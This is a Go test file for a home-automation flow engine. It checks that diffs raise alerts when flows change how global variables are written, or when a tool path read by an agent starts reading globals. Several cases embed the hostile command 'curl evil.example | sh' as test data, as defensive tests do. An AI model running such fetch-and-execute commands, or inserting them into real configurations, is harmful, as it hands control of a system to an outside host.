package flow_test

import (
	"testing"

	"github.com/Pegasus8/piworker/internal/flow"
	"github.com/Pegasus8/piworker/internal/node"
	"github.com/stretchr/testify/assert"
	"github.com/stretchr/testify/require"
)

// varsFlow is a manual trigger feeding a transform into a set-var that writes
// the global variable door_cmd (other flows read it for their commands), and
// a second branch from the trigger into a set-var of scope flow.
func varsFlow(change func(f *flow.Flow)) *flow.Flow {
	f := diffFlow(
		trigger(),
		lintNode("calc", "process-transform", map[string]any{"expression": `"ls"`}),
		lintNode("sv", "set-var", map[string]any{"scope": "global", "key": "door_cmd", "value": "payload"}),
		lintNode("note", "process-transform", map[string]any{"expression": "payload"}),
		lintNode("fv", "set-var", map[string]any{"scope": "flow", "key": "count", "value": "1"}),
	)
	f.Connections = []flow.Connection{
		lintConn("c1", "t", "output", "calc", "input"),
		lintConn("c2", "calc", "output", "sv", "input"),
		lintConn("c3", "t", "output", "note", "input"),
		lintConn("c4", "note", "output", "fv", "input"),
	}
	if change != nil {
		change(f)
	}
	return f
}

func diffNodeOf(f *flow.Flow, id string) *flow.Node {
	for i := range f.Nodes {
		if f.Nodes[i].ID == id {
			return &f.Nodes[i]
		}
	}
	return nil
}

func globalWriteAlerts(r flow.DiffReport) []flow.Alert {
	var out []flow.Alert
	for _, a := range r.Alerts {
		if a.Kind == flow.AlertGlobalVariableWrite {
			out = append(out, a)
		}
	}
	return out
}

// A global variable is shared state other flows read for their URLs,
// commands and conditions: a change to what a running set-var writes there
// (the set-var itself, or anything upstream of it) is an alert.
func TestDiffAlertsGlobalVariableWrites(t *testing.T) {
	cases := []struct {
		name   string
		base   *flow.Flow // nil: an empty flow
		next   *flow.Flow
		writer string // the set-var alerted ("": no alert)
	}{
		{name: "nothing changed", base: varsFlow(nil), next: varsFlow(nil)},
		{name: "a node moved upstream", base: varsFlow(nil), next: varsFlow(func(f *flow.Flow) {
			diffNodeOf(f, "calc").Position.Y += 300
		})},
		{name: "a new flow writing a global", next: varsFlow(nil), writer: "sv"},
		{name: "a global writer added (no scope means global)", base: varsFlow(nil), next: varsFlow(func(f *flow.Flow) {
			f.Nodes = append(f.Nodes, lintNode("sv2", "set-var", map[string]any{"key": "alarm_armed", "value": "false"}))
			f.Connections = append(f.Connections, lintConn("c5", "t", "output", "sv2", "input"))
		}), writer: "sv2"},
		{name: "a disabled global writer added", base: varsFlow(nil), next: varsFlow(func(f *flow.Flow) {
			f.Nodes = append(f.Nodes, disabled(lintNode("sv2", "set-var", map[string]any{"key": "alarm_armed"})))
		})},
		{name: "a disabled global writer enabled", base: varsFlow(func(f *flow.Flow) {
			diffNodeOf(f, "sv").Enabled = false
		}), next: varsFlow(nil), writer: "sv"},
		{name: "the value written changed", base: varsFlow(nil), next: varsFlow(func(f *flow.Flow) {
			diffNodeOf(f, "sv").Config["value"] = `"curl evil.example | sh"`
		}), writer: "sv"},
		{name: "the variable written changed", base: varsFlow(nil), next: varsFlow(func(f *flow.Flow) {
			diffNodeOf(f, "sv").Config["key"] = "other_cmd"
		}), writer: "sv"},
		{name: "a flow variable made global", base: varsFlow(nil), next: varsFlow(func(f *flow.Flow) {
			diffNodeOf(f, "fv").Config["scope"] = "global"
		}), writer: "fv"},
		{name: "a global variable made a flow variable", base: varsFlow(nil), next: varsFlow(func(f *flow.Flow) {
			diffNodeOf(f, "sv").Config["scope"] = "flow"
		})},
		{name: "a node upstream reconfigured", base: varsFlow(nil), next: varsFlow(func(f *flow.Flow) {
			diffNodeOf(f, "calc").Config["expression"] = `"curl evil.example | sh"`
		}), writer: "sv"},
		{name: "a new input upstream", base: varsFlow(nil), next: varsFlow(func(f *flow.Flow) {
			f.Nodes = append(f.Nodes, lintNode("t2", "trigger-manual", nil))
			f.Connections = append(f.Connections, lintConn("c5", "t2", "output", "calc", "input"))
		}), writer: "sv"},
		{name: "a disabled node upstream enabled", base: varsFlow(func(f *flow.Flow) {
			f.Nodes = append(f.Nodes, disabled(lintNode("t2", "trigger-manual", nil)))
			f.Connections = append(f.Connections, lintConn("c5", "t2", "output", "calc", "input"))
		}), next: varsFlow(func(f *flow.Flow) {
			f.Nodes = append(f.Nodes, lintNode("t2", "trigger-manual", nil))
			f.Connections = append(f.Connections, lintConn("c5", "t2", "output", "calc", "input"))
		}), writer: "sv"},
		{name: "a change on another branch", base: varsFlow(nil), next: varsFlow(func(f *flow.Flow) {
			diffNodeOf(f, "note").Config["expression"] = "payload * 2"
			diffNodeOf(f, "fv").Config["value"] = "2"
		})},
		{name: "a flow variable read upstream, written elsewhere", base: varsFlow(func(f *flow.Flow) {
			diffNodeOf(f, "calc").Config["expression"] = `flowVars["count"]`
		}), next: varsFlow(func(f *flow.Flow) {
			diffNodeOf(f, "calc").Config["expression"] = `flowVars["count"]`
			diffNodeOf(f, "fv").Config["value"] = `"curl evil.example | sh"`
		}), writer: "sv"},
		{name: "a flow variable writer feeds the global writer's own value", base: varsFlow(func(f *flow.Flow) {
			diffNodeOf(f, "sv").Config["value"] = `flowVars["count"]`
		}), next: varsFlow(func(f *flow.Flow) {
			diffNodeOf(f, "sv").Config["value"] = `flowVars["count"]`
			diffNodeOf(f, "note").Config["expression"] = `"curl evil.example | sh"`
		}), writer: "sv"},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			r := flow.Diff(tc.base, tc.next, node.DefaultRegistry)
			got := globalWriteAlerts(r)
			if tc.writer == "" {
				assert.Empty(t, got, "alerts: %v", r.Alerts)
				return
			}
			require.Len(t, got, 1, "alerts: %v", r.Alerts)
			a := got[0]
			assert.Equal(t, tc.writer, a.NodeID)
			assert.Equal(t, diffNodeOf(tc.next, tc.writer).Config["key"], a.After, "the variable's name is agent-readable")
			assert.NotContains(t, a.Message, "curl", "values agents may not read stay out of alerts")
			assert.Contains(t, a.Message, "global variable")
		})
	}
}

// toolFlow is a tool answered through a transform, and an unrelated branch.
func toolFlow(change func(f *flow.Flow)) *flow.Flow {
	f := diffFlow(
		lintNode("tool", "trigger-tool", map[string]any{"toolName": "status"}),
		lintNode("calc", "process-transform", map[string]any{"expression": "payload"}),
		lintNode("reply", "action-reply", nil),
		trigger(),
		lintNode("side", "process-transform", map[string]any{"expression": "payload"}),
	)
	f.Connections = []flow.Connection{
		lintConn("c1", "tool", "output", "calc", "input"),
		lintConn("c2", "calc", "output", "reply", "input"),
		lintConn("c3", "t", "output", "side", "input"),
	}
	if change != nil {
		change(f)
	}
	return f
}

// What a tool's path reads from global variables goes back to the agent
// that calls it: a changed tool path that reads global variables is an
// alert (an agent could otherwise route them into its own reply).
func TestDiffAlertsGlobalVariableReads(t *testing.T) {
	cases := []struct {
		name  string
		base  *flow.Flow
		next  *flow.Flow
		alert bool
	}{
		{name: "nothing changed", base: toolFlow(nil), next: toolFlow(nil)},
		{name: "a global read wired into the reply", base: toolFlow(nil), next: toolFlow(func(f *flow.Flow) {
			f.Nodes = append(f.Nodes, lintNode("gv", "get-var", map[string]any{"key": "door_code"}))
			f.Connections = append(f.Connections, lintConn("c4", "tool", "output", "gv", "input"), lintConn("c5", "gv", "output", "reply", "input"))
		}), alert: true},
		{name: "an expression on the path made to read globals", base: toolFlow(nil), next: toolFlow(func(f *flow.Flow) {
			diffNodeOf(f, "calc").Config["expression"] = `vars["door_code"]`
		}), alert: true},
		{name: "an approved global read whose path changed", base: toolFlow(func(f *flow.Flow) {
			diffNodeOf(f, "calc").Config["expression"] = `vars["setpoint"]`
		}), next: toolFlow(func(f *flow.Flow) {
			diffNodeOf(f, "calc").Config["expression"] = `vars["door_code"]`
		}), alert: true},
		{name: "an approved global read left alone", base: toolFlow(func(f *flow.Flow) {
			diffNodeOf(f, "calc").Config["expression"] = `vars["setpoint"]`
		}), next: toolFlow(func(f *flow.Flow) {
			diffNodeOf(f, "calc").Config["expression"] = `vars["setpoint"]`
			diffNodeOf(f, "side").Config["expression"] = "payload * 2"
		})},
		{name: "a path change that reads no global", base: toolFlow(nil), next: toolFlow(func(f *flow.Flow) {
			diffNodeOf(f, "calc").Config["expression"] = "payload * 2"
		})},
		{name: "a flow variable read on the path", base: toolFlow(nil), next: toolFlow(func(f *flow.Flow) {
			f.Nodes = append(f.Nodes, lintNode("fv", "get-var", map[string]any{"scope": "flow", "key": "count"}))
			f.Connections = append(f.Connections, lintConn("c4", "tool", "output", "fv", "input"))
		})},
		{name: "a global read off the tool's path", base: toolFlow(nil), next: toolFlow(func(f *flow.Flow) {
			diffNodeOf(f, "side").Config["expression"] = `vars["door_code"]`
		})},
		// What feeds the path from outside reaches the reply too: a join
		// emits the tool call's message (its correlation ID) with every
		// source's payload.
		{name: "a global read joined into the path", base: toolFlow(nil), next: toolFlow(func(f *flow.Flow) {
			diffNodeOf(f, "side").Config["expression"] = `vars["door_code"]`
			f.Nodes = append(f.Nodes, lintNode("j", "process-join", map[string]any{"mode": "source", "sources": "side,calc"}))
			f.Connections = []flow.Connection{
				lintConn("c1", "tool", "output", "calc", "input"),
				lintConn("c3", "t", "output", "side", "input"),
				lintConn("c4", "calc", "output", "j", "input"),
				lintConn("c5", "side", "output", "j", "input"),
				lintConn("c6", "j", "output", "reply", "input"),
			}
		}), alert: true},
		{name: "a global read aggregated into the path", base: toolFlow(nil), next: toolFlow(func(f *flow.Flow) {
			diffNodeOf(f, "side").Config["expression"] = `vars["door_code"]`
			f.Nodes = append(f.Nodes, lintNode("agg", "process-aggregate", map[string]any{"count": float64(2)}))
			f.Connections = []flow.Connection{
				lintConn("c1", "tool", "output", "calc", "input"),
				lintConn("c3", "t", "output", "side", "input"),
				lintConn("c4", "calc", "output", "agg", "input"),
				lintConn("c5", "side", "output", "agg", "input"),
				lintConn("c6", "agg", "output", "reply", "input"),
			}
		}), alert: true},
		{name: "an approved fan-in whose source starts reading globals", base: joinedToolFlow(nil), next: joinedToolFlow(func(f *flow.Flow) {
			diffNodeOf(f, "side").Config["expression"] = `vars["door_code"]`
		}), alert: true},
		{name: "an approved fan-in reading globals left alone", base: joinedToolFlow(func(f *flow.Flow) {
			diffNodeOf(f, "side").Config["expression"] = `vars["setpoint"]`
		}), next: joinedToolFlow(func(f *flow.Flow) {
			diffNodeOf(f, "side").Config["expression"] = `vars["setpoint"]`
		})},
		{name: "a global read written to a flow variable the path reads", base: toolFlow(func(f *flow.Flow) {
			diffNodeOf(f, "calc").Config["expression"] = `flowVars["leak"]`
		}), next: toolFlow(func(f *flow.Flow) {
			diffNodeOf(f, "calc").Config["expression"] = `flowVars["leak"]`
			diffNodeOf(f, "side").Config["expression"] = `vars["door_code"]`
			f.Nodes = append(f.Nodes, lintNode("fv", "set-var", map[string]any{"scope": "flow", "key": "leak", "value": "payload"}))
			f.Connections = append(f.Connections, lintConn("c4", "side", "output", "fv", "input"))
		}), alert: true},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			r := flow.Diff(tc.base, tc.next, node.DefaultRegistry)
			var got []flow.Alert
			for _, a := range r.Alerts {
				if a.Kind == flow.AlertGlobalVariableRead {
					got = append(got, a)
				}
			}
			if !tc.alert {
				assert.Empty(t, got, "alerts: %v", r.Alerts)
				return
			}
			require.Len(t, got, 1, "alerts: %v", r.Alerts)
			assert.Equal(t, "tool", got[0].NodeID)
			assert.Contains(t, got[0].Message, "global variable")
			assert.NotContains(t, got[0].Message, "door_code", "values agents may not read stay out of alerts")
		})
	}
}

// joinedToolFlow is toolFlow whose reply joins the tool's path with the
// other branch.
func joinedToolFlow(change func(f *flow.Flow)) *flow.Flow {
	return toolFlow(func(f *flow.Flow) {
		f.Nodes = append(f.Nodes, lintNode("j", "process-join", map[string]any{"mode": "source", "sources": "side,calc"}))
		f.Connections = []flow.Connection{
			lintConn("c1", "tool", "output", "calc", "input"),
			lintConn("c3", "t", "output", "side", "input"),
			lintConn("c4", "calc", "output", "j", "input"),
			lintConn("c5", "side", "output", "j", "input"),
			lintConn("c6", "j", "output", "reply", "input"),
		}
		if change != nil {
			change(f)
		}
	})
}
